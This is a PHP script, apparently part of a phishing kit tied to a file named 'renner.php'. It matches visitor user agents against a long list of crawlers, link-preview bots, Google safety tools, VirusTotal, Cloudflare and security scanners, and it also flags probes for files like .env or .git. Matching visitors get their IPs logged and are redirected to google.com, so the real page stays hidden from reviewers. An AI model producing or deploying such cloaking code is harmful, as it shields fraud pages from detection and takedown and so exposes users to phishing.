<?php
require_once('renner.php');

$LINK_REDIRECIONAR = "https://www.google.com/";

$palavras = array(
    'facebookexternalhit', 'facebook', 'Facebot', 'WhatsApp', 'WhatsappBot', 'WhatsAppBot',
    'Twitterbot', 'Pinterest', 'LinkedInBot', 'Slackbot', 'Discordbot', 'TelegramBot',
    'Instagram', 'InstagramBot', 'TikTokBot', 'Snapchat', 'SnapchatBot', 'WeChatBot',
    'LineBot', 'KikBot', 'ViberBot', 'SignalBot', 'MessengerBot', 'MetaBot', 'MetaInspector',
    
    'Googlebot', 'Google-InspectionTool', 'Google-Site-Verification', 'Google favicon',
    'APIs-Google', 'Mediapartners-Google', 'AdsBot-Google', 'AdsBot-Google-Mobile',
    'FeedFetcher-Google', 'Google-Read-Aloud', 'DuplexWeb-Google', 'googleweblight',
    'Storebot-Google', 'Chrome-Lighthouse', 'GoogleProducer', 'Google-Safety',
    'Bingbot', 'BingPreview', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou',
    'Exabot', 'SeznamBot', 'Applebot', 'NaverBot', 'Yahoo! Slurp', 'AOLBuild',
    
    'AhrefsBot', 'MJ12bot', 'SemrushBot', 'DotBot', 'DataForSeoBot', 'ZoominfoBot',
    'CCBot', 'PetalBot', 'Bytespider', 'MauiBot', 'Nimbostratus-Bot', 'BLEXBot',
    'Scrapy', 'HttpClient', 'Python-urllib', 'Java', 'curl', 'Wget', 'Go-http-client',
    'PhantomJS', 'Selenium', 'HeadlessChrome', 'node-fetch', 'axios', 'okhttp',
    'Masscan', 'sqlmap', 'zgrab', 'Xenu', 'nikto', 'OpenVAS', 'Nessus', 'BurpSuite',
    'Metasploit', 'Acunetix', 'Netsparker', 'AppScan', 'w3af', 'Skipfish', 'ZAP',
    'Arachni', 'Gobuster', 'DirBuster', 'WFuzz', 'Sqlmap', 'Hydra', 'JohnTheRipper',
    'Nmap', 'Nessus', 'OpenVAS', 'WPScan', 'JoomScan', 'DrupalScan', 'MagentoScanner',
    
    'UptimeRobot', 'Site24x7', 'NewRelic', 'Pingdom', 'GTmetrix', 'WebPageTest',
    'SSL Labs', 'Qualys', 'SecurityHeaders', 'Observatory', 'SSL-Tools', 'CheckTLS',
    'VirusTotal', 'Sucuri', 'Cloudflare', 'Incapsula', 'Akamai', 'Imperva',
    
    'bot', 'crawler', 'spider', 'scan', 'scanner', 'check', 'validator', 'monitor',
    'scraper', 'hacker', 'exploit', 'injection', 'xss', 'sqli', 'brute', 'force',
    'spam', 'phishing', 'malware', 'virus', 'trojan', 'rat', 'keylogger', 'rootkit',
    'backdoor', 'shell', 'c99', 'r57', 'b374k', 'webshell', 'deface', 'leak', 'dump',
    'bypass', 'override', 'fake', 'spoof', 'hijack', 'middleware', 'mitm', 'sslstrip',
    'heartbleed', 'poodle', 'freak', 'logjam', 'drown', 'beast', 'crime', 'breach',
    
    'Huawei', 'ZTE', 'TP-Link', 'D-Link', 'Netgear', 'Tenda', 'Asus', 'Xiaomi',
    'MiBot', 'Hikvision', 'Dahua', 'Cisco', 'Linksys', 'Belkin', 'Netcomm', 'Tplink',
    'Zyxel', 'Ubiquiti', 'MikroTik', 'Synology', 'Qnap', 'WesternDigital', 'Seagate',
    
    'zgrab', 'Zmeu', 'ZmEu', 'admin', 'wp-login', 'xmlrpc', 'phpmyadmin', 'mysql',
    'cpanel', 'whm', 'webmail', 'plesk', 'directadmin', 'vpn', 'proxy', 'tor',
    'anonymizer', 'hide', 'cloak', 'mask', 'obfuscate', 'redirect', 'iframe',
    'cookie', 'localstorage', 'sessionstorage', 'beacon', 'track', 'analytics'
);

$useragent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

$url_suspeita = false;
if (isset($_SERVER['REQUEST_URI'])) {
    $uri = $_SERVER['REQUEST_URI'];
    $padroes_suspeitos = [
        '/\.env/', '/wp-config\.php/', '/config\.php/', '/\.git/', '/\.svn/',
        '/\.htaccess/', '/\.bak/', '/\.old/', '/\.temp/', '/\.swp/', '/\.sql/',
        '/phpinfo/', '/debug\.php/', '/test\.php/', '/adminer\.php/', '/\.json/',
        '/\.xml/', '/\.yml/', '/\.ini/', '/\.log/', '/\.DS_Store/', '/\.ssh/',
        '/\.aws/', '/\.well-known/', '/acme-challenge/', '/\.php\./', '/\.jsp/',
        '/\.asp/', '/\.aspx/', '/\.cgi/', '/\.sh/', '/\.pl/', '/\.py/', '/\.rb/'
    ];
    
    foreach ($padroes_suspeitos as $padrao) {
        if (preg_match($padrao, $uri)) {
            $url_suspeita = true;
            break;
        }
    }
}

$pattern = '/(' . implode('|', array_map('preg_quote', $palavras)) . ')/i';

if (preg_match($pattern, $useragent) || $url_suspeita) {
    try {
        if ($conexao_tipo == 'pdo' && $conexao instanceof PDO) {
            $stmt = $conexao->prepare("SELECT bloqueados FROM ipsblock WHERE ip = :ip");
            $stmt->bindParam(':ip', $ip);
            $stmt->execute();
            
            if ($stmt->rowCount() > 0) {
                $stmt = $conexao->prepare("UPDATE ipsblock SET bloqueados = bloqueados + 1 WHERE ip = :ip");
            } else {
                $stmt = $conexao->prepare("INSERT INTO ipsblock (ip, bloqueados) VALUES (:ip, 1)");
            }
            $stmt->bindParam(':ip', $ip);
            $stmt->execute();
            
        } elseif ($conexao_tipo == 'mysqli' && $conexao instanceof mysqli) {
            $stmt = $conexao->prepare("SELECT bloqueados FROM ipsblock WHERE ip = ?");
            $stmt->bind_param("s", $ip);
            $stmt->execute();
            $result = $stmt->get_result();
            
            if ($result->num_rows > 0) {
                $stmt = $conexao->prepare("UPDATE ipsblock SET bloqueados = bloqueados + 1 WHERE ip = ?");
            } else {
                $stmt = $conexao->prepare("INSERT INTO ipsblock (ip, bloqueados) VALUES (?, 1)");
            }
            $stmt->bind_param("s", $ip);
            $stmt->execute();
        }
    } catch (Exception $e) {
        error_log("Erro ao bloquear IP: " . $e->getMessage());
    } finally {
        header('Location: ' . $LINK_REDIRECIONAR);
        exit();
    }
}
?>